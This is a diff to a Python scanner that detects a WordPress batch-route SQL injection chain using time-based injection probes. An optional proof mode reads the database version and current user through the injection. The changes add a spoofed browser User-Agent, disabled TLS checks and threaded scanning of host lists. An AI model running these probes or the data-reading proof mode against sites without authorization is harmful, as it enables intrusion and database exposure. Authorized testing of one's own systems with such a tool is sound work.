@@ -28,18 +28,45 @@ Usage
     python3 wp2shell_check.py -f hosts.txt --authorized --json
     python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)
 
-Exit codes: 0 = vulnerable, 1 = not vulnerable, 2 = inconclusive/error.
+Status values:
+  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
+  affected_version  - fingerprinted version is in an affected range but the active check did
+                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
+                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
+  not_vulnerable    - active check negative and version outside the affected ranges
+
+Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
+Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
 """
 import argparse
+import concurrent.futures
 import json
+import ssl
 import statistics
 import sys
+import threading
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
+from collections import Counter
 
-__version__ = "1.0.0"
+__version__ = "1.2.0"
+
+
+class _KeepPost(urllib.request.HTTPRedirectHandler):
+    """Follow redirects but PRESERVE the POST method and body. urllib's default handler
+    downgrades a redirected POST to a bodyless GET (301/302/303), which would silently
+    drop the batch payload when a site redirects http->https or to a canonical host and
+    produce a false negative. We keep POSTing to the Location instead. Loop protection
+    (max_redirections) is still enforced by the parent."""
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
+            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
+            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
+                                          origin_req_host=req.origin_req_host,
+                                          unverifiable=True, method="POST")
+        return super().redirect_request(req, fp, code, msg, headers, newurl)
 
 
 class Target:
@@ -48,25 +75,56 @@ class Target:
         self.timeout = timeout
         self.sleep = float(sleep)
         self.route = route
-        self.batch = None   # resolved endpoint URL
-        self._base = 0.0    # measured baseline round-trip (set by detect(); used by the oracle)
-        opener_handlers = []
+        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
+        self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
+        self._normalized = False # whether the base host/scheme has been canonicalized
+        # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
+        # common on test targets). Equivalent to `curl -k`.
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
         if proxy:
             opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
         else:
             opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
         self.opener = urllib.request.build_opener(*opener_handlers)
 
+    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
+
+    def _normalize_base(self):
+        """Follow redirects on the root once and pin the canonical scheme://host, so the
+        batch POST goes straight to the final host (http->https, apex->www, etc.) instead
+        of relying on a redirect for every probe. Only scheme+host are taken (never a
+        redirected path), so REST routes stay correct."""
+        if self._normalized:
+            return
+        self._normalized = True
+        try:
+            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
+            with self.opener.open(req, timeout=self.timeout) as r:
+                u = urllib.parse.urlparse(r.geturl())
+                if u.scheme and u.netloc:
+                    canon = "%s://%s" % (u.scheme, u.netloc)
+                    if canon != self.base:
+                        self.base = canon
+                        self.batch = None  # re-resolve endpoint against the canonical host
+        except Exception:
+            pass
+
     # -- HTTP ---------------------------------------------------------------
     def _raw(self, url, data=None, headers=None, method=None):
-        req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
+        hdrs = dict(headers or {})
+        hdrs.setdefault("User-Agent", self.UA)
+        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
         t0 = time.perf_counter()
         try:
             with self.opener.open(req, timeout=self.timeout) as r:
                 body = r.read()
-                return r.status, time.perf_counter() - t0, body
+                return r.status, time.perf_counter() - t0, body, r.geturl()
         except urllib.error.HTTPError as e:
-            return e.code, time.perf_counter() - t0, e.read()
+            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)
 
     def _endpoints(self):
         if self.route == "wp-json":
@@ -101,18 +159,20 @@ class Target:
 
     def probe(self, author_exclude):
         """Send one injection carrying <author_exclude> into author__not_in. Returns (status, elapsed)."""
+        self._normalize_base()
         body = json.dumps(self._envelope(author_exclude)).encode()
-        headers = {"Content-Type": "application/json", "User-Agent": "wp2shell_check/%s" % __version__}
+        headers = {"Content-Type": "application/json"}
         if self.batch is None:
-            # resolve which endpoint form the site accepts (a processed batch answers 207/200)
+            # resolve which endpoint form the site accepts (a processed batch answers 207/200);
+            # pin the post-redirect URL so later probes hit the canonical endpoint directly.
             for ep in self._endpoints():
-                st, _, _ = self._raw(ep, data=body, headers=headers, method="POST")
+                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                 if st in (200, 207):
-                    self.batch = ep
+                    self.batch = final
                     break
             if self.batch is None:
                 self.batch = self._endpoints()[0]  # fall back; timing still decides
-        st, el, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
+        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
         return st, el
 
     @staticmethod
@@ -160,7 +220,12 @@ class Target:
 # -- version fingerprint (best-effort, read-only) --------------------------
 import re
 
-AFFECTED = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1)), ((6, 8, 0), (6, 8, 5))]
+# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
+# actively testable: the confusion is what bypasses input sanitization to reach the sink.
+FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
+# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
+# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
+SINK_ONLY = [((6, 8, 0), (6, 8, 5))]
 
 
 def _ver_tuple(s):
@@ -173,7 +238,7 @@ def fingerprint_version(t):
                       ("/readme.html", r"Version\s+([0-9.]+)"),
                       ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)")):
         try:
-            _, _, body = t._raw(t.base + path)
+            _, _, body, _ = t._raw(t.base + path)
             m = re.search(pat, body.decode("utf-8", "replace"))
             if m:
                 return m.group(1)
@@ -186,7 +251,11 @@ def version_verdict(ver):
     vt = _ver_tuple(ver) if ver else None
     if not vt:
         return "unknown"
-    return "affected-range" if any(lo <= vt <= hi for lo, hi in AFFECTED) else "outside-affected-range"
+    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
+        return "affected-full-chain"
+    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
+        return "affected-sqli-sink-only"
+    return "outside-affected-range"
 
 
 # -- driver ----------------------------------------------------------------
@@ -209,9 +278,25 @@ def scan_one(url, args):
     rec["fast_s"] = round(det["fast"], 3)
     rec["slow_s"] = round(det["slow"], 3)
     rec["delta_s"] = round(det["delta"], 3)
-    rec["status"] = "vulnerable" if det["vulnerable"] else "not_vulnerable"
-    code = 0 if det["vulnerable"] else 1
-    if det["vulnerable"] and args.proof:
+    active = det["vulnerable"]
+    vv = rec["version_verdict"]
+    rec["active_check"] = "fired" if active else "negative"
+    if active:
+        rec["status"] = "vulnerable"                     # actively confirmed via the injection
+    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
+        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
+        if vv == "affected-sqli-sink-only":
+            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
+                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
+                           "there is no unauth active check on the 6.8.x branch")
+        else:
+            rec["note"] = ("version in the full-chain range but the active injection did not fire "
+                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
+                           "-- treat as affected and patch")
+    else:
+        rec["status"] = "not_vulnerable"
+    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
+    if active and args.proof:
         try:
             rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                             "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
@@ -221,15 +306,19 @@ def scan_one(url, args):
 
 
 def human(rec):
-    tag = {"vulnerable": "VULNERABLE", "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
+    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
+           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
     line = "[%s] %s" % (tag, rec["target"])
     if rec.get("wp_version"):
         line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
     if rec["status"] == "error":
         line += "  -- %s" % rec.get("error")
     elif "delta_s" in rec:
-        line += "  [fast=%.2fs slow=%.2fs delta=%.2fs]" % (rec["fast_s"], rec["slow_s"], rec["delta_s"])
+        line += "  [active=%s fast=%.2fs slow=%.2fs delta=%.2fs]" % (
+            rec.get("active_check", "?"), rec["fast_s"], rec["slow_s"], rec["delta_s"])
     out = [line]
+    if rec.get("note"):
+        out.append("        note: " + rec["note"])
     if rec.get("proof"):
         for k, v in rec["proof"].items():
             out.append("        proof  %-16s = %s" % (k, v))
@@ -246,6 +335,9 @@ def main():
     p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
     p.add_argument("--timeout", type=float, default=15.0)
     p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
+    p.add_argument("-t", "--threads", type=int, default=10,
+                   help="concurrent workers for -f scans (default 10). Timing detection is "
+                        "robust under concurrency because the multi-second SLEEP dominates jitter.")
     p.add_argument("--authorized", action="store_true", help="assert authorization for remote targets")
     p.add_argument("--json", action="store_true", help="emit JSON")
     args = p.parse_args()
@@ -267,21 +359,61 @@ def main():
             "Affected remote targets: %s\n" % ", ".join(remote))
         return 2
 
-    results, worst = [], 1
-    for u in targets:
-        if "://" not in u:
-            u = "http://" + u
-        rec, code = scan_one(u, args)
-        results.append(rec)
-        if not args.json:
-            print(human(rec))
-        worst = 0 if (worst == 0 or code == 0) else code
+    def prep(u):
+        return u if "://" in u else "http://" + u
+
+    def work(idx, u):
+        try:
+            rec, _ = scan_one(prep(u), args)
+        except Exception as e:                       # one bad host must never kill the run
+            rec = {"target": prep(u), "status": "error", "error": repr(e)}
+        return idx, rec
+
+    total = len(targets)
+    workers = max(1, min(args.threads, total))
+    results = [None] * total
+    lock = threading.Lock()
+    done = [0]
+
+    def emit(idx, rec):
+        results[idx] = rec
+        with lock:
+            done[0] += 1
+            if args.json:
+                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
+            else:
+                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
+                print(pfx + human(rec), flush=True)
+
+    if workers == 1:
+        for i, u in enumerate(targets):
+            emit(*work(i, u))
+    else:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
+            try:
+                for fut in concurrent.futures.as_completed(futs):
+                    emit(*fut.result())
+            except KeyboardInterrupt:
+                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
+                ex.shutdown(wait=False, cancel_futures=True)
+
+    results = [r for r in results if r is not None]
     if args.json:
+        sys.stderr.write("\n")
         print(json.dumps(results, indent=2))
-    # exit 0 if any vulnerable, else 1, else 2 on pure error
-    if any(r["status"] == "vulnerable" for r in results):
+
+    c = Counter(r["status"] for r in results)
+    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
+                     "not_vulnerable=%d  error=%d\n" % (
+                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
+                         c.get("not_vulnerable", 0), c.get("error", 0)))
+
+    # exit 0 if any host needs attention (actively vulnerable or affected version),
+    # else 1 (all clear), else 2 (all errored)
+    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
         return 0
-    if all(r["status"] == "error" for r in results):
+    if results and all(r["status"] == "error" for r in results):
         return 2
     return 1
 
